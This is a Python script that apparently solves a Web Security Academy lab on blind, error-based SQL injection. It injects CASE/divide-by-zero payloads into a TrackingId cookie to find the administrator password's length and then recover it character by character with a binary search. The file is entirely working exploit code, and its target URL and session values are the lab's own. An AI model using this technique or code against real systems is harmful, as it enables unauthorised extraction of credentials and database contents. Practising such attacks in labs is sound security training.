import requests
import string

url="https://0aeb0025037e6a7986207afe005900e7.web-security-academy.net"
tracking_id = "Alx9KHim4qcwbnb5"
session = "GMGiGijMmZhFkJMe6fOy5qSDltzhQv06"
user = "administrator"
possible_characters = string.digits + string.ascii_uppercase + string.ascii_lowercase

get_password_length_operation = "(select length(password) from users where username='{}')".format(user)
get_password_operation = "(select password from users where username='{}')".format(user)


def payload(condition):
	return "' and (select case when ({}) then 1/0 else 1 end from dual)='1".format(condition)

# returns error when the password length is size
def payload_password_length(size):
	return payload("{}={}".format(get_password_length_operation,size))

# returns error when the password has password[position] fulfills the operation for new_char (for example, password[position] > new_char)
def payload_password(position, new_char, operation):
	return payload("substr({},{},1){}'{}'".format(get_password_operation,position,operation,new_char))
	
#returns the character 
def binary_search_char_position(low, high, position):
 	
	if high >= low:

		mid = (high + low) // 2
	
		if not requests.get(url,cookies={"TrackingId":tracking_id + payload_password(position, possible_characters[mid], '='),"session":session}).ok:
			return possible_characters[mid]
			
		elif not requests.get(url,cookies={"TrackingId":tracking_id + payload_password(position, possible_characters[mid], '<'),"session":session}).ok:
			return binary_search_char_position(low, mid - 1, position)
		
		elif not requests.get(url,cookies={"TrackingId":tracking_id + payload_password(position, possible_characters[mid], '>'),"session":session}).ok:
			return binary_search_char_position(mid + 1, high, position)
		else:
			return -1

	else:
		return -1




# find password length
def findPasswordLength():
	password_length = 0
	while requests.get(url,cookies={"TrackingId":tracking_id + payload_password_length(password_length),"session":session}).ok:
		password_length += 1
	return password_length

# find character at each position
def findPassword():
	password_length = findPasswordLength()
	password = ""
	position = 1
	new_character = 0
	while new_character != -1 and len(password)<password_length:
		new_character = binary_search_char_position(0, len(possible_characters)-1, position)
		password = password + str(new_character)
		position = position + 1
		
	if len(password)==password_length:
		return password
	else:
		return null

	
print("Password = ", findPassword())
